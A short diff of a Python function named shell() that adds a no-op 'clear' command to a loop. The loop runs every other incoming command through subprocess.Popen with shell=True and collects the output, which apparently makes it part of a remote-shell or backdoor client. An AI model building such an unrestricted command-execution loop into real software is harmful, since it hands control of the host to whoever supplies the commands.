@@ -21,6 +21,10 @@ def shell():
 
         elif command[:3] == "cd ":
             os.chdir(command[3:])
+
+        elif command == "clear":
+            pass
+
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read()
